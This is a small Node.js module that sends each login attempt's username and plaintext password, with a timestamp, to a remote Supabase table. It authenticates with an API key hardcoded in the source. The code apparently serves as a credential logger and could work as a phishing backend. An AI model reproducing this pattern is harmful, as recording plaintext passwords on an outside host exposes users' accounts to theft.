const fetch = require('node-fetch');

const supabaseUrl = 'https://yayrbsvafizrldmkxtvj.supabase.co/rest/v1/log';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlheXJic3ZhZml6cmxkbWt4dHZqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTg0MTU0NDUsImV4cCI6MjAzMzk5MTQ0NX0.alW7sPzJLaJA_V9Ou4H7QtVotfpJQY9xqIplpr7gN4Q';

const logLoginAttempt = async (username, password) => {
  const response = await fetch(supabaseUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'apikey': supabaseKey,
      'Authorization': `Bearer ${supabaseKey}`
    },
    body: JSON.stringify({
      username: username,
      pass: password,
      time: new Date().toISOString(),
      ip: '127.0.0.1'
    })
  });

  const data = await response.json();
  if (response.ok) {
    console.log('Data inserted successfully:', data);
  } else {
    console.error('Error inserting data:', data);
  }
};

module.exports = logLoginAttempt;
